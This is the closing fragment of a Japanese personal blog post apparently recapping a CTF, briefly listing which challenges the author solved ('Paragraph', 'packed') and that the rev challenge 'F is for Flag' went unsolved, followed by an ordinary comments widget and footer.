<span class=sr-only>見出しへのリンク</span></a></h2><p>最初にParagraphに手を出し, 解けたので余っていたpackedを解き, revのF is for Flagに手をつけた. 途中でJumpをguessすることと2時間の仮眠を挟んだ. 結局F is for Flagは解けなかった.</p></div><footer><div class=comments><script>let getTheme=window.localStorage&&window.localStorage.getItem("colorscheme"),themeInParams="";getTheme==null&&(themeInParams!==""&&themeInParams!=="auto"?getTheme=themeInParams:getTheme=window.matchMedia("(prefers-color-scheme: dark)").matches?"dark":"light");let theme=getTheme==="dark"?"github-dark":"github-light",s=document.createElement("script");s.src="https://utteranc.es/client.js",s.setAttribute("repo","caphosra/caphosra.github.io"),s.setAttribute("issue-term","title"),s.setAttribute("theme",theme),s.setAttribute("crossorigin","anonymous"),s.setAttribute("async",""),document.querySelector("div.comments").innerHTML="",document.querySelector("div.comments").appendChild(s)</script></div></footer></article></section></div><footer class=footer><section class=container><p>Footer? なにそれ美味しいの?</p>© 2019 - 2024
caphosra</section></footer></main></body></html>